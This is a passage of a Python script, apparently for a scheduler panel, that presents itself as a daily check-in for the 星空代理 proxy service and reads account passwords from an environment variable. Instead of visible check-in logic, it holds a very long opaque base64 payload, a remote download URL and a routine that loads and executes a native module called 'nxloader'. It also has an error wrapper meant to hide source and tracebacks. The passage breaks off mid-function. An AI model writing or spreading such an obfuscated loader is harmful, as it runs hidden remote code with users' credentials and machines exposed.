# name: 星空代理签到
# cron: 0 38 9 * * *
#环境变量XKDL，账号@密码多账号换行
import logging
import asyncio
import urllib.request
import platform
import sys
import os
from typing import Tuple, Optional, Dict, Callable, Set
from dataclasses import dataclass, field
from functools import wraps


@dataclass
class Config:
    """统一的配置类，管理所有可配置参数。"""
    # Script info
    SCRIPT_NAME: str = "xkdl"
    FUNCTION_NAME: str = "gogogo"
    DOWNLOAD_URL: str = "https://raw.giteeusercontent.com/kele2233/but/raw/ma/file"
    CODE_PAYLOADS: Dict[str, str] = field(default_factory=lambda: {
        "3.0": "fChSVFBhY2tAUkQyAQAAKgB8qX6Io1RcoKFtZZecqJnqNWs0SSt0ai9wMEZTR0o5Vk9EUHBob1BqOGYzQ1FnVEFiUVlIckdWbVRRV0ljbERseGtPZVdkRlVGUjh3bjNKczM1NTk5SHNqSE9uWkM5WmdPblRsREpsOG5NRVM4dTl6ZUxOOElsSmttRm85VWtvNitDZkdrUjd4OFlMV1RSZ2x0Q01KUkJnMjFWbzNMd1B5cW1qKzU2UXVBTGNranpGZnRsNWhiUXpqemROYmpUVVkvQVJGVVc2NzFudHNISFhzMTM3MFl4NDhPcW1PdndVSmd2WU8yejNsUTZZRGllSnRCT1NzYXZDUnFhVEFLbzh6MlhOOCs2a0NyVnJvYmFySHRvbEsxKy9NeVQ0S2V1V05RNG1uaE5XZm05VGI5MUFYS3NjRjhDVDlEelZXTDZlMURwd3FubUl6T09obzRvY3pFOEZCV3ZkWWcyVlpYaVFaRHBob1d6RVpZWUloeW9SOFRBY29EZjB0blVOK0pNb1dBcXp5UjVkZlZkZElsd1RpbmJsS1RZeXhUWEZWaGlXdHI3V1hxcHBWNCttNU9qdkZ1Y2RVTmw1ZXJpY3lNdTZISEZUdzcvTGwvY2YrU2lzWnZuS05iQXRpZWlYd29uNHE3MTU1U0dVK3d0S09sN1dFaGE1OU5STzJBR013TDFUeThPOHlvVXg4UTBEdVBEN1NDWmVpY0VBNEE1TFZsY1BZcGhFRlpsRExQWjc1NGRVakpBMFBSKytBUkp5QzI0Sk44b0NzRmUrc2tCTFlaYWdsYUdLU0g0YVVFdDdxWCs1TjE0ZTljYmxTRWw3dVJyWGEwZ3BkTnBUcXpUa1g5b3RjNER0UkFwcnoyeXVKQmZ4M29IcXFlRk5meWhodjdwU21GUDF1ZWt1MHlodlJHcmFTUS9zYTVSQWZ2aVhqZzVUcXYxazBVRnJmTHhLb3VBTVhOLzRlbFQ1QlVuL2ZEY2pGYTBxVSs1ZnNxVzk5NzUraXhVbFhZb1ZoMkYwYUZ6d3JxN2hOQ25hS2FZeFd0UjgzaEZnamlWYTFLSmhJVjNPWEhuTVNMWGt4eXpqVmpLeGp0bm5WUTNqbFNTeG5NUjVmMC9hV01KVmdjcnRDcmc0QzRFTnBNWEdlbkZYVEJ5Q2d4MEN4eHEyMzc1YmhrbFF6bW9GbllJeGNCNThlMGFLbFVoaGpMNTYxVUJYTENScTgvOWt4WjExMzZ0ZlFvNThBVFNjWnpqbENSM0xObUlCdis1M2VMdzNFMSttSHhVYWdGQWN1cDBNM0JhcUxYT0tWNVoxNEJuemVZWkRTRVdObzYvK2RCRUNGUVFQTHczdEhoekF0LysrYzVZdG1UUE94UnQwZ3REeTJDdDI0MTRvRW1lS3ZyRFVBMWQzUDhRSXhmU3F1WlZXWHdaeHc1WVc3bStGRkdQSmM3QW1hMVBpcGFzS2Zrek5pUER5N2h5SHJTR3NLR0FJQ2dGOU1UaHpSSHU2bzRleDltbVlsZ1RkOVpzMnlYVHNWaWFwbmhrcy9mSzE1ZytsOTFsbzlrYldsYVVYWnpJTUQyeWZFM0FkZ3ZoU1F4UjJMbWxORCtsVjk4OHlHRzVMdnViUG9tMVp5ZmQzNWtuK3VGSWgzZ2FXbzNJVUZlK1A1SU1pTnZEcjlnbGNISU9Cc0pVK1QrT2dxOVMyR24zd2M4ZHhiYjhvYXdaS2hKQ2lRQ01rSThBSkQ5NVZzTnJTM0JFTXV2U3owSUwxR0xhdEgvYWxKUFVQWnZFWW04ZFd4V29EN2hWWkxSOFN5RWJuL3B1QmFhREdmMk5JUEJscS9HVUprNEp6TkZOVFNiRWJiRFJUN0JXbGI2aHlGblBjb3dzYVBZTXdTWWRieGVjcUx0S2hUbURmT04xUHdXbEprVWhJc3RxNEg4OC9xUGtBOFpUSlpQbzVEM2JIS2dLUnhOanI1eUxGLzNFcVRmMS9iRHphLzgrSy82a2hmdHpLcnVvQVk0d1JqM2t6MUtEdnpnM0hKa3A3OS9tTHRWbG5aZjJndzdwS2M0WUxxT2FaOHNYQ0h5VDBjcXFrdVpuWkJ5N1lwR3htckI0QlA4N0YzQ3Zpd1UwMWFhbWNjMzZxdUJDRXNKcS9ZZlJnd1pMVy9mNGJKSzJodEFWZHg4b3NON3FrRGhBejdQcmNpMENRMFJFSlZ5Vi9qWXA1aHdrMDZoYmx5RkdnVVI4dmkzTTJ3cFltVXNGdjF5bDdCTUVoNEY5Y0szNE1GK3dBUDFQUUY1VW4vUlJ1YUQ0RGdyQXpQVTNlRTI0N2FUd0dtdFVadjBBVEZNTkQ3OHhSb3hESG5zZ0xKV1FpVng1RzZHbG42dEZjVW9sNGR0VEFPdFJjZWFGNU1GZ2hYZ2dmZEhIMUZlOXUvZGdFWE1acU1VN0QvKzFnTWhUUGFsbTYybGNja1R4V0wxSnV4TzZpUEZiZVhTQXNQQWRXZGNCRVRHWmY0Z01jdUVrT2hQVStaSWx1b1JKRm9QSlZRdk1GR29obHBZSHQ4R2d4dnJiMTM1NmZsK1Iwc0F1cU0rSUk5bmxQT1EwUDVaTldyRmdrNW8ybnQxSWJJa0FxdmE2NU9vbXVNVmxWdzJMdFdMZXE4M0tpazRJak5FUUNPL0IwRGVDNkJSeEhCd3ZMS052Z3JSRVVKZEZBMWdsYWJoQ0w1RGpMbElMSVN3VFQzeGUva216T1BhS1NndWk2Y2V6dEZUTlhDckRtQ05DSWdvdDJVTlczVy81ajFZZ2c4WERSQUV3Ri9CWndRdHRqNHcvYWh5ZVRhWmdMbGdWa1h3RjM0TTcvRUx0UWZac05sQUxXYyszVGNpTzMxNUQyaGluUzJhVk9iN0Y5amgrcXAxbGtTTHJ6ZFEzZE16cGlBZlJzeEZPSk1CcHpyS3FpUHBlNEtZeUNLYUZOWGN2Y3JaNHU2YnNOUFdMQ1NnN3V4a3hWYmZUdktuZjNZaVp2R3U2RjA5bXgzYlpVTUNiS2dhWUpoT3g3cXovR1lBdjBnL2dEUXhSeEpWVmJHUHFWRnVxakc1bkpBS2ZhYTFoTktISERJcnJ2S3NjcEV3VXpTdnBieVZuZko0ZFJnYVI5aHJNRk5XNm82N2MyR05uSk9icHNZVlhEcy93Z0ppU3MzR00rbU9jRGt0VngxaHRlSU00czAzZS93azJqQkRwSTM5ZDZPYWdIc2lTcUFRSmdNZkpRSEJnczBBOGZtUDMrcDZJTjlLdVhFZUUzSWt4bHpoc1FOYmhSUk1GV0tWSjBRY1pHQUd0ZGkxcGFEMXEvSzk5aFpMbi9LL0FLQ3A0WW1Ua1F6M1NmR1hvTWN1V1BveVN3M0cyMk1WdE9wQVozckxHK0h6V1FOdnFmbmxJTkpHTGpNVHM4R1RuWkRWMDc1dzlRUzIwRklrOU5GdGt1QkxLckdISk5iWHhEVGZUVFhac3Q5RFJFd3BFVnp4ZDVueU9JVnF1cERubklJQnZSbGJIVTFtSVBqMGZMOWRXV1BFSVl1bnlyTzRtaFFXUUg3Y0NWTlZ1WXBmNW5WVFFPNm1LQm1GWCtHb0ppbUJIQWt6bGxwRzRBdzhHZUJMVWlGQmtrVjFseGU2MS8zdjhjaWxTUEg0Q0Y4TlcyTjJJTzFSN0gwd0xMU255NG96MHlNQXFUbGtpWUh4SXBHZW5zVVgwb29jSHBPNVRyWnZDTzZra1dQMkZ6czFvN3lOL2ZBTXliTEsrQTFydkF2Mjg5UVJPMjJIcnBYSFJTZnh5TEZmVlFRemlsQml2OUdhRWxRWDBObFl1OG5say8ydTBzVzVvMFNqSFU1dDVCL1k4S0dlRXZqQmp1aVdUQU5uUnFxU1NVR3FrNnZZcEZTYjZaTTdlSVNaK2NHK1RFR3QwZ2FGSDRVOWhTeVFiVmpVZlMxTWJCazQ0WUlnRThxeHBvY1cwMmtQVDZBd1h5bWJuR0Q0cTRTSllxRTVBZWhkZTV2N0duU3EvUlNHN3BmWVlDckxRTjZ5Z2w2K0xRNUZIYTVFWXBhZTFvK3lFOHpZNkFBbTl4ZFRmQm1VdXBXSzJZNlJOR1hHaFl2ODhPSVRXYnhZbTZLUkl0eVdyZWRpN0hnNU1kZ056cThCczJmOUtBdmovblhSZVRLUUJXVTBkNVphYjhFaUtkVEVkZXNtT202cUYyeG9XV2QzWE9MYWJ1TzVJcU1BTTdWeDhnSDNLV2hOMlBxbGs2R0NOZkw3dEdoNy9jMG5hTzU1ZUlhSXJpM0dqVjZxVHArQmRSQnBBK2hwRjAwbTFrczhaMTZPdklWSWcvc0N1Z3QwQ1A3OGxJZ3VPNmNua082VlQ3TXdkZk5NYUZPeExoUDVtSVRIYkxWNFNiSWRYbExVczBUaVdMV2o1VkIvbEdGVUZEMkNEVmZQVTdmYllyMUpPZzk5Vk1EODVhTlZiL0J0c2pxQ0xIeUt2Y0w1TXJUUVB3WVkrMG01RVVSRS9GQ1dKMCtXQ2Q3TWE0dVp6eGRmR3pFQTg3MWw5OFd3SkQ0WGlXV3BwU3RFUjBxaWFGdmsxRUV6TEl5ZVl0YjltN0lGdjNLVnFlaDdPZWdjTWFrNHo1T3pRNjFHQUVIdm1yTlBVcHNLaG9CRm5pSlEvZlYxTjVVN3ZObnF5cytLNVplR3JKZ1dCbnJwSnA3cHo0aUhjZEpXQzZ4clZVUkloYStyV0owRXA3elFJdkVGTTNXTFE3K1RyTFlOY25xL2p4cWtEOFZ1T3V5dENJTHZ2ZjZWanNDNUdYV3NiUFRsbkNWTlEyWmRGb1kzUHJRNHVVc1o4Q1VLYzNmRTJjaDFnQmp6NmpuYnZtTjJlMGM3WTJHSG9JWTdVMGZYZEVjMzZtMWVVcjY2MndQUzA0SndZanpUQ2gyRkJpOFYxb09RK2libjNFeXRhL1lyc05oYVB4MEZvR2dJRHordHdaVFpPZXA3dmJqNVR5aEo1YndjY0srNE9BV2h5aWozQ3ZrWFRRamk4UDZCZnRKU0xnZEdDVFkzZUZFZ1YrWnVpWng3RXJCd09yQlJZVUVRb0FRNUlvSU9yWHB1bkM5MDE0SmVaL1RUMXJGeHhidUNDWitEVFgwQkUxNWhLMGFwVitrM3NFOVhrTWxRcmNibHRxSUlNemxsVEdHcFFxdW5sc3VpQXJwVEl6eS95STVML29UM2VGQ0lSTkFKbVU1Vm44a1VNdzkvTk0zeHBiUmVGZStyUGxtNG53Y3BDK2hEaDlRVHhDQnBiellJd2kwM0lCaEZFL3dUTXU1cTZIUHpoYTkrR1BCQmhlZHNUUTNqNUNlTlVZYlp1b05PUFNLcTZsc3B2M1pQUUJxUnBTUVp4eEtSdDVtVFYvWWNmeWJJZjd5cVAxb0tHOVFqOXc2Wi9HWGFHVU5odStoSmUrQ0hTd3dmYUw2V3R1QWNENEVFVUw0RkxSQUVhSTFTY2czZkVad3psUE05dmFXRUx3TWw0SHpwQWd4THhnSkdTdWlPdm1SZUlDcGtGcmNHUU1ZdGIwWjFqcUxwbWtLTTcxZFR5bXlEY2l1cXAwdFJYbTVKOGpXd1lTNE9mQmhONisxTnZjZWFWSVFoSXdadFkrSWhFSit1c1RXSmNvTStoMXNZdUd6YlpaSXhhemMzNFhrTVZGK2M1a0lPVGx2dE1mWUR4RmVVU3M5cGh4aTFjQUxDdU4wdnRXbERzM3ZneVA3YU5FUDNLc0lUU3RydmhuNncvc1NOMDYyT3pDT2JnbWw0eXJiYU9ENmtrZi9XSmVIL1krZlBnNXI3SkExdTh2ZHBHSUQrdDdtYUJqZlZuUEVRcG96eEhDNzEza1E5YkdxUlhyMmk1ZGlBS3BEUnRmT0ZTTm1QNXZhbXBScllWRTdsKzhZQjNodnR0UFNoVysydWNSWlVCdCtQS0FSUGUvZkNod0NHTEF1ZktqYmR5V2pJaGdObUJCcGQ5SWxrWloxcmJVa3lFN1RKNGdyZ203S2oyZGRnV1BWL0hsUmp2MlhwUEM2eUdDemRTZ2VpUW95c0F6VjkxZlllL09ZRVRKRFFURjFEcFZjMVpqVTQ5ODZHcUlpQUFFVmIzUmJ1dDI2QUd3Y08waHlrR3RKYVlWZEFoOFVsdDJocWczVmFZbWZULzR4cGlibXp3SkdMNi9oVFBZZTNmYTkvL3J6eVB2bEc0c294Z3YreUtwM2o0ZGFzMzJVbENWTi9KMlJKYlFYOUdiOXJFNVBpUm9Ub2lBUUx4RFlEOWlZRjlFd1RxaitYVXp3RWFjTHNoTnk0ejl0ZmpQVHpKZ1ZNdnlkRXc1c3o2RVFSL1RzYWNFT1NmWU45YU82SkcrSFd2RkZURkVlajlBdmV5N3NKeEp5bzFoUDB4bzk2SVhtMjFlU1NpWDdqRlZCUWNWZ1VmdW1SUVpMOFdzMUVNQzBLdGozM0RRMU9zWGZEWjNqa3NjMk9TYnA0ZUN2RzBtZmdkbGhnQU1TL1ZpTUsvV1ZkcHYwbVBaNkJaSTQyY2VaYWVlNXo5aEVrNERVa29EZjVHZFlaT29Pa2RvRFZlNnhCZVhaWlhMZ3BaTmtBUzhTaVZUaTdZbWRqTTVqa202eEhORE50QkZQdkJvU0tVU0pZZTQxelQ0ZURiTHA0Z2pwMU9qQWQxdDZYSjNJWmhaTTl1eDZJQ3RPcmRZcHkzN25uRlFBWUFDWEZrbjQ2VkhQRGlmMmdFbHJtUTc0Nm1RclhEYjJsRWdGZUdhVkI0UmM5ME5LMDFLQkJLYk51WGpwQTVOUWVCVGVENjJXMGdBdUx2SzFwNlMvNXA3cnByQmZ2R2plM0VPeHFYMVJKc2pUV2tud05ZRWxqMHZ0YlNhRk1ZSXNVM3FhU0NJeFUrenVka3BLUU13R04ycVg0U09qQ3htY3ZJS3Q3Q3Yxd1NWQmhJV0R3UWUvemEwaUJaZysvUjdSZkhuODFzVUIwcXMzYUtCK0F5dUNUZGV2K1p2UTRKVVd4NkFuSnd0enErT3JmWnVYTS9qeDFmN01HNjNjOW5MSGpaR2xJNURBKzFnUWlLVTJUSU1wOGd6VkdmODJqZ0ZsNHRSR1Q5ZFdiYlRHbkV4dXUzVDdmOHRTTm9NMCtkbzhEbW1uSE5pZXB2VFJNN0RGVkpKZlRhQjBzNE85OGJ0YmJWdU1jaUljZlZ5cU5QYjMrby9pa29zY1JlS1ZKeS9VcmtpSWxHQW83dGlSemRsdzZrZGd2Wmk1S3pGckVlYTFsc0pkZUxDck5RbG53eXFnRk80U2NvVnBGT1lRbjc1R3Vja2t6N0RoWEExNzlSeloxQ0grZTlobVJLdmNCT0NDaVNBRTVTV09zR2wxMnluU1c3TUMxOGhmVUZQeVlrNTJGOGVyU1JtY1ZPbVZVTC80T29iaFJOdi9OV0NrLy84c29Ea04vZmhWWFVvUlFRbzQzWGkwQWgwVER2R1pIRG9KNjArWWY5TTcxYndCSmh6ZFVXUkc0a3JFaXRQb0RTV1RSd2NzelhoNTVwQ3ZYMXMydFh2aUN3bEpkRWlENjNpVmt0eUFWSXM1M1kzRVAwUnR4OElzVHdRelF3aXVtVDQ0N2ZjTFVHME84T1dDY2kyM215cjZ5bU54RWJGN0lzNXRPNkF3bnVqS25YNmVpTW9xUWtGMUdBZVMvRThwUCtoTmxkZy9XaDJqQmRtd2pLZ1JqQVZ5eEh1bzhnazdQMDlJcSt2OUx5NWUwTFl6MmVGaXMzS00yZmFWb281SU44Y3ZDRlFDZGxBZkNoVncrblQ4bWZTTlZrWXhYNFRsOHE5ZjBFZTg5TUtINlBtd2VrZHMrV2dDUXJMZmM0MDVTbGp2YWl3dFlKNXdYWjl6U3BkSTVlSjRiUVI2MVY1Y0ZKY0pEblUvdlJ4UDhkQkNKcnpmQkhGc3Qxa25RNXovdERuR0lHQ1hJMS9qUVVNVVh2U2xUWmRSVUJJdSswa29TWjdsWk5hYk5WMGNUUVJQeFZTdHBUS2dqWE41eVpEbDN3NGtRTlUrNnloUU11QWVpaEQ1TFl2OHVVSWc4UmRIY2duSm1VVk96RXZ1YUg1aEhiMm9idUtuVXpmRzVYTzJxT2lKVlVLZ2lScWJnM3BDL3VLSGVpdkh5R3V5VDNUZ3ZoVXlQVHczSldPS2lPTW1jbTBDaHFuczJkVFM5V3pnU25kQlU3dEh4RjFobmJLaXBEZXZoN3MrZlhLS2wwQTJ5UXpsRkd1eVJINmN1dnBJaTBzZ3E1WkxMVGhBSVBOeWpWK0JwV2F1cnFqZXZmS0ZWeHVobmYxWUwrRDFpc1YyWGxEc3pzSFN5WnhRaUdOUFRsZDNUVCtIb2UvV1pPaUhGYzRneWIwUzZTRmliNUppbzNqNVNJbC82K2JabmhYQjlLUlQ2SDRzM0NMWDRGTjFNTlErVTUxOHpKRmtDVEVLNGwyb0ltazdUaVpMMDFSQ0gwa1dZaGdtM2dPS0lHMjJOVjNLRUhuV3RHN3dEbysvN3YrN3FMM3d1bTRMZyt1eElaV0NiUEVURmlVZlVKQXFxTUpVeCthY2k1OXFNaHJhTFlSUmNscFd5NGZjeDU0VTVCS21GRG1kN1NHbnRVa1pLbjlicEhkcGt0czVpZTlCL05XTmoyOGFFK2dzdG5UcGl3V0NMRVczRi9JbVhCOHEyUFhCRE1XdTlMZ2RFd0RtUVlXaTBBT2pqTDRhMEVJeitIZG9CNXdyeHpwWUNQQTF1c1lOdFZscG9OMlpFVno0dklTMWFTcmk2bzhHTC9Qa1R4d0srcFI5WlVJcnpjUFJUT28vTGJHSmxxbHZpWjg1aG9sTGxDbDFjSGpBRnRxS0NIWHlQOVowcm9FUnJrejZmakhiRW45TDRNUWY3cVEwVEJZMUpxaWRzeVpBci9jZmptUHJTRWtDSkpDTDc5eWpxa2VVd3pySmhFUkJ3dU1HY1lMRnNjNGZpcDJoa2IwbG8wWTNGSlB3elI3QmR5THZIUFlVT0tFUkozV2pSbWJkR1FVTHVnaHJLRnZUTHZiZzBlQ204cWp3ZUl5TVFvayt1VUpZdDBjOU5JTUpTZmtmMlNDK3dTdVd5Z3ppSXJxeGIrR2hGYU9rNENJVUJQOVJENVdhTE1BZ2lSckdYb2RkeEJBSkc1Y3FtUEcweFp4YWdkakUvMTBMcU5NVXMwVWQ0TkhteXBWOEJpL1grUVlrbHdwU3RZczJHaDZlY2xLWStDczZUaFdBaGcrZXN1Y292VFlPZEhlMVR6elZVWkY4aGRhZ3hYUjhyaU1KRmNrTXhjcTVsZ3ppUXllTGtCYllodHhoY1hlYW9GU3R0U3E0b0RTMDhJYzNGTitONk5WK095VCtiZ3BweENRZXdETGdqQ214ekIwcFZlblhiaHNiSXhyUGZOWmNQbDJCbVNNeUJaek4yV1NkNm1GRDVHSHRLU0xCQlVhNWpvSzROUGppeEJtTjUwcWJKSisyVVpNdnBsajJYMWR6Z2RyRW9iL1IvUXNGemlkUEdkMThobjNkRmtNYjBYQVo3VWRweUt6enpObHIrUUk3Z1R4QW52dkEvUWt5NW5HWHp4bHJEaVIwWE9EVGNMSlZPL0lyWWRZNFZKUmZuUzdPWVFneGFEejc5ckpLTjFJdDJTcGZDckV0Y1Z5WVFyaFAxWm5yT2Y1TDMrSjdMOHFDbytsenVIZWdGcEZtL2owRkRxR3V3eGtUMDlQMUNnNzczdkFCWlZiZC84VWE1NDZ6OXAxK0ZYN2NKayttaW1FZ2x4OEdTSE5rN0pOQVNkOSthMVBLMk5PNFNOcWtqdWl6WlYzYnJPUmxsMHcrQTZUYzlXekdyeDlnMm5JT3h2K1lRSDZEbG5KaW1tM0J1THZPclNXclJTVVlwS2cxT1NieEd0Zm12bEdFd2hPbThRdlVBMjRBRUJ0Rjk0YnozM0swamZiVXVlYk1qeU56V1JzS2VmaUJLZG5valAwMVZnRGFJRm43MUJ2Wkg4NWV5bmlFb1FDeW1sK296ZHcvWk5Tc1NVOGZvN0IxUEQ3SStJRFRERVJISXpPbmlZaFlUeVBUeHZDdVFPVHRabVdHVHNIb0xLQTF1MTRjR0cwVDBQbzZ5Y09ySVhkMW5CY0V6M0ZZY1JGM0NYMVFXbDIvT2RrcjlraWtWMVJkMkhKNDZZUi8zZ3FKcDc0bUV3WHFtc2JiaVRwbUFtaDlvQkJHVzl5OS9DSWNmdGc4b3ByUGU5WGNFVkFoQXNMVmdVSEhWQXhLQjNSSis3NFo4WFk1OWkyN21xd1hSMEdUTVhOakxyalJhM3gzUXlSMTZmK1ErZVN6VUtLa1lpUjJmcnJhVkdqWjFCeXlvRDBiUmlnVmhVRlY2dFRCcnFLSjNjN0lKVDVqNkRNaHl4TTVRR01zUm9hL3NCOThTRTNsWlZsRXl6aG94N0IrTElvNWJPNStPT2J3Q29kSEd4ejVWdXpNUjlOd3FNUGRNQ1duKzAzellwWHExQzJDc0VGVXRoV1E0ZGNrRTV6eFFVVEoxc2pKN0NFM1U3K25GUndzMHJyREVydmY1YU5UYzJ4TW85MWtkekhMTXdHd3orQUhjTFpmOU15emI4ZEJvTGR1QTd5RDF2ekdzR2tlcTVmRTNNYlgraWVQSm91V0VhWXZsa1krNTJ2YnduakM0a3EyK0hQczdGNlJsTjA0SlRYTzJBVmNvMW5oYXVoLzhzQlNpQmYxcFo4RVBkaERtWHNPVlMwZHRUejIzL2o1VVRnYmZUOVhhck5kUW01SkR2U1ltaWo0YXdJMWhKSWd4cEZsVEpIa20rai9rbVNYSmdKWEdXbG5rcllaRGZTVHh2Z01rRTVNTzdUelcrd0tkOVQ1dUk1R251RWNHUlZVbVJyemQwNGZ6eUxhMzVCcm04ZHBHUmJqVWd3ZllmaFN4WTNZQlQwMU94TkprcHdvYi9OVlloQWU3Z1R0dk1JS2puWlhIcFlra1hRMmZETnVCRW9ka2Juc2YwWUlIVEptL0FSL2FMU0IrWVlWWURQRXpBcmxuMVBmYXNFWVkyVXA2S01oV0xsVHl0aS9hQlNTRUVGSGFpUFpUelZhMU1OcEFZNGpCZmNFWXFKK3RkanFNRlBLU3dmbFIzN0t3VEk2T3kvNmw0NmN2dWhBbENwaTBwYmxoZzJVU2ltM2tRbnQzbWJPVmtIUGM4YU45bnREcGM2amw2NzhZUGZjK2FNQkp4TXRrVkFNM2E4Z3RGNDlEbElSMUJZZFZoa2s2aTFYbmduMXVrTVZNNkEydEtyMWlrZHZrOUxoZmhabFZTM041b21PdTZxT1VPY3lyTkhUdUE5UUdNZi8yYzl0V01rOFE2WG5ZWERwakN0ZXBkNm9USmRaTFRYRkI1YmtQcEc3eE5TZ2lpbXlRUWFwamQ5N2t0RThDMUNlc040SHprUVI2NTJzbFRQYkZwUENPK1pKdlpqNGF2SG5CMXNVb0dZTFFoeWxqeU9ta1BNYkVJOHdQdVBPek5RWVlHaVRoSXRubGVXRnhhSjlCK0c2ekZsTXhvd0prMExBVDBHZE45Z3haczFnMUQwOUR3V3pyN25ZNUVDQU9IeVY3dmNtZVRVSkExQlJ6ZDl5OVFZYllOdGlvanlLanUrdVdteFg0VTE2TERUQzJxcnpLd3ZrUjYzY3BWa3hnSDBQTWc0aVphbktMajNoMjgrNG1aNjVEVEIwU2plSTE0MnQxQld1NGF0N29xN2V3L1pJdWFtRWV3Vlp1cmNkVDlEcm1Yd1NUZEwwNXduU0dDUEw5eU1UUnFndEJHNktSWlN3blpkRzg0eWFjdGQ0eThFY2xrekRMeHREMzZmTk1xNjZ6ck9meFdveDJSQW5ZREU1cDhOaDlZNlM1TTA4L09YL3N6NXhxZ0JHMGQrWUVTV2tnbUVsWm10WG9xd3I3RmZMMXErRGhvOEFkQW4rdXNkTVkzeGdnRDNXV0VIK0x2cW5POUVhaHo5K1RMRVFRM0txbkJZTUtJZEd3OTVnWUp0aEtsTmMrRUFtd3kzcmpBRStQZUI5YzgwWktEUlJIUkZZVC9XU1pPT20vTVF0eEJqQnNEb2h0ZU9OYlZHc1JEZ0ZITTNsTEJ5bkR3Z0tKS0VBd0dqZGRVUmV6bmk5c0FvbFhManlHNDYwOWRHZmJVYTA0VFdJSW1rUjdIblFNK0RZSnVuN0JuU2xPM3QvdUpYM0lFZDlLeFluSkd6UGswV2RzMmdiRnhDMXdXdk51STMyUEJuWVVUSGZMQmk5VHM0UjNJVVRPQ3BxR0NmYkpreVdLUlR5RVZ0cFY0OVU4OE5VNzJCY3huYmt2S29mK0hnWEFuRUJJZWxIMGlhVGVaQ0d0U3d2U0daaXdCODV0eU1BbzVpd1ZVdWdmWHlkaGRaaG5xR0ppMFgva2E3N1I1NkFHVkxSbUFUdGI3NFFCSGsvMEp4VXpvaEphb09xTlZKQ1dLS0dCQ3IyMkRYb3FpQlBRYkxHM3hQNGNKTnJHbjNCWEZJZzlxV2w5Tlg4RDJWRFZBVWN0WEQwMnY0MXlQQXdlS2o3alpTamFGbnQ0czlaa3lPVUhHNk5OSm9OQzBOdERwR0hJTmpBUnhmakx4U2F3V2xUNWhKOTFKVmkrMjE4azFsM0tyc1JudkJQZXE2M0syclJrZGhldHBkV2dkZjE0VWdNVXgyZnNlREdSRHlBcUpWTHlob1VGNWtLbFlLWHl6SE9MdmN3SHVjZmtiSGQvSDFBZEppb1daWjNaYVZHL3B1UllCaE9abU5jaGV2VG52WW9WRzNkWnh0cWNQaDRjNHkvTmtzMUR0Ri84azJCeDhXSyt5NjMrN3JGVVdSTTBGL1NOYkZncklRQ0d0VWRHM2FzeDB1YmpXL1NCeEVJT1AwVDBXTFJkUTgvUGs5Q0FIZzJmemZ6dXRsNDN6ajgyNnk0bENpNzNTd01pNzloNWtaQnpGMU9xRnRCMitJOWFwUWgvOThYT3ZjK2VHSWhxNHBGL1YzUmRlK1dNQjZraVRyZFZUQjZKdXZmU21GNTc4dnhGczByOVY2NUhwNGUyelJ2dmRVTlpRc2tmVFgwVUIxVlZrTk1zOHg4ZkhIT21adVpHM2ZqYjRjdzY4QjlvWGN2OWdHSXNsVWEyaHVjZjd6cnpJTlRoWGVKbFJ3bEU1dGlxOVRSVWZ1WEhDd0tTdzdOeXppQ2NicXozaUFSTlVzOFEvSnNvTjZsWFppVGxxa0o1bmhnaXVqbWkyQ1kwa092QTZycG9GY05pNE1ZVXQ5VHpIU3ArVU5ibFJNSEJlZG1LTmc5bHIvK000aVJ2c09CdlRWem96OXhxYXp4TGdZRXFXTi9iTzlHYlBIbk9aYzFhUWcrZ2dyWm5hcXZ6Y1V6ZkZlQ3pFeDNEcG1vOWE3SEwyZjlJbmh0S1BtRXJidGdheW1KZmQ4djZuc01JZU9zUDZWZ3ZDZzJSeW1UMVZMOW1MeDNKTzJ6ZHBEUzNOTm9KUHF6R0RxTnpTNVVvUUZ1N245MUlvS0Q5ZksycFp2S2RYelFKQlh0RVhISW01QTU5MW9lRzJndjdJRzEyVlZPbVAwUEM3elJvUEJQR1NWUk1DK1h6clZaZk5TVmdhWGJzb054MVlOckNRMWtNQkd1YWU5dWtCOSszdXl0WjFnQXRnYXg3MVV0Rmt1ZE9ST1g5UmlyMzBRY2tKNmQyZDd2dXhrbFRWMUd2SE9FenZmZlBhUnhhUlVlL0xXU2N5K0NFWXE2RmxiTUg3bmhsM3RvdVIxNkFLbnNCUWFYYVhHaS9ERjlua1Mrc2VOUGU1QkJhb3RaaE9TMjl1QXJjdXowcmhRVHlFM3RBR1FuZ3lXWjQ3TVJ5a0xlbC90UkZSbDVXUE5VeWMzS2FNN3BvbWhCdFB0MExjc2VMWVQ1NlFqWUZJTHp2V3kxNFBzT0VFdDVZS3VuN0hzNEtpQTdDNWwxRHNTVlZWMTNpZmQ2eWswemJFaVZjWjhXNi9GTC9ENnlYdmNpckNETVdncDlKd2Q5ZHVNQVNRWm5CUkRzWlV5UEZUOEx1UkVxQVdnR2pvY3FrSVltM0VuVVNmanhRZFN6R0Q5RmtLekZqQ1VjTTZTdlUzYVJ1VmphUlB4N0d0VFBDeWtqUW5hZ0ZYTE8rYlorN0VnVXF0NHBKbW9jUTJ3d2tBN0VBcVRCV0hLOFMxNnlGc2NzVGpFSzNhSit3TVEvN2REVEJEemJIUjJnandBTUJKY1BEWi93MW1WK2FHTEFWS01xVTlkUXYrelZmK0p4ZzNSOUE5RUFQVmdob1pyVnBjL1BXbWk0bkZReldxZUhpWlFxdnhYYU5qY0lZM1pp"
    })
    # Environment constraints
    SUPPORTED_PYTHON_VERSIONS: Set[int] = field(default_factory=lambda: {10, 11, 12})
    SUPPORTED_OS: str = "Linux"
    SUPPORTED_ARCHITECTURES: Set[str] = field(default_factory=lambda: {'x86_64', 'aarch64', 'armv8', 'armv7l'})

    def download_url(self) -> str:
        return self.DOWNLOAD_URL

# --- Logging Setup ---

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# 生成时替换：本包要求的最低 loader 版本
MIN_LOADER_VERSION = "2.3.6"


def _ver_tuple(v):
    try:
        return tuple(int(x) for x in str(v).split('.'))
    except Exception:
        return (0,)


def _ver_ok(v):
    a, b = _ver_tuple(v), _ver_tuple(MIN_LOADER_VERSION)
    n = max(len(a), len(b))
    return a + (0,) * (n - len(a)) >= b + (0,) * (n - len(b))


def _load_so(path):
    """按指定路径加载扩展模块（同进程内可加载不同版本，模块名固定为 nxloader）。"""
    import importlib.util
    sys.modules.pop('nxloader', None)
    spec = importlib.util.spec_from_file_location('nxloader', path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules['nxloader'] = mod
    spec.loader.exec_module(mod)
    return mod

# --- Decorators & Helpers ---

def handle_errors(func: Callable) -> Callable:
    """异常处理装饰器：统一对外文案，不输出源码/行号/异常链。"""
    @wraps(func)
    async def wrapper(*args, **kwargs):
        try:
